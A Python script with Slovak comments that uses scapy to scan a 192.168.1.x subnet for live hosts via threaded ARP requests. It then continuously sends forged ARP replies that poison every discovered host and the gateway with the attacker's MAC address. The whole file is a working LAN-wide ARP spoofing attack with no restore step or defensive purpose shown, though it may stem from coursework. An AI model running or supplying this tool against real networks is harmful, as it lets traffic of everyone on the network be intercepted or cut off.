# metody send_ARP, get_MAC a start_poison_thread boli inspirovane nasledujucim linkom  
# https://github.com/ickerwx/arpspoof/blob/master/arpspoof.py  
# v metode start_poison_thread som velku cast poovodneho kodu nepouzil a vyrazne som ju zjednodusil pre nase potreby

import threading
import time
from scapy.all import *

IP = 0
MAC = TARGET = 1

# toto riesenie threadu s return value som sa inspiroval na nasledujucom linku - https://stackoverflow.com/questions/6893968/how-to-get-the-return-value-from-a-thread-in-python
class ThreadWithReturnValue(Thread):
    def __init__(self, group=None, target=None, name=None, args=(), kwargs={}, Verbose=None):
        Thread.__init__(self, group, target, name, args, kwargs)
        self._return = None
    def run(self):
        if self._target is not None:
            self._return = self._target(*self._args, **self._kwargs)
    def join(self, *args):
        Thread.join(self, *args)
        return self._return


def get_MAC(interface, target_IP):
    source_IP = get_if_addr(interface)
    source_MAC = get_if_hwaddr(interface)
    p = ARP(hwsrc=source_MAC, psrc=source_IP)  # ARP request by default
    p.hwdst = 'ff:ff:ff:ff:ff:ff'
    p.pdst = target_IP
    reply, unans = sr(p, timeout=1, verbose=0)
    if len(unans) > 0:
        return 
    return reply[0][1].hwsrc


def start_poison_thread(targets, gateway, attacker_MAC):
    finish = False
    while not finish:
        for t in targets:
            send_ARP(t[IP], t[MAC], gateway[IP], attacker_MAC)
            send_ARP(gateway[IP], gateway[MAC], t[IP], attacker_MAC)
        time.sleep(2)

def send_ARP(destination_IP, destination_MAC, source_IP, source_MAC):
    arp_packet = ARP(op=2, pdst=destination_IP, hwdst=destination_MAC,
                     psrc=source_IP, hwsrc=source_MAC)
    send(arp_packet, verbose=0)


def spoofer():
    gateway = "192.168.1.1"
    # eth0 je ak je lan kabel
    # wlan0 je ak je wifi
    interface = "wlan0"
    attacker_MAC = get_if_hwaddr(interface)
    targets = []
    threads = []
    threadsNum = 0

    potentialTargets = []
    for i in range(2, 120):
        ip = "192.168.1." + str(i)
        potentialTargets.append(ip)

    for t in potentialTargets:
        threads.append(ThreadWithReturnValue(target=get_MAC, args=(interface, t)))
        threads[threadsNum].daemon = True
        threads[threadsNum].start()
        time.sleep(0.01)
        threadsNum+=1

    threadsNum = 0
    time.sleep(2)

    for t in potentialTargets:  
        mac = threads[threadsNum].join()
        if(mac):
            targets.append((t, mac))
        threadsNum+=1

    gateway = (gateway, get_MAC(interface, gateway))
    print("------ start poisoning all detected IP adresses -----------")
    print(targets)

    # create and start the poison thread
    poison_thread = threading.Thread(target=start_poison_thread,
                                     args=(targets, gateway,
                                           attacker_MAC))
    poison_thread.start()

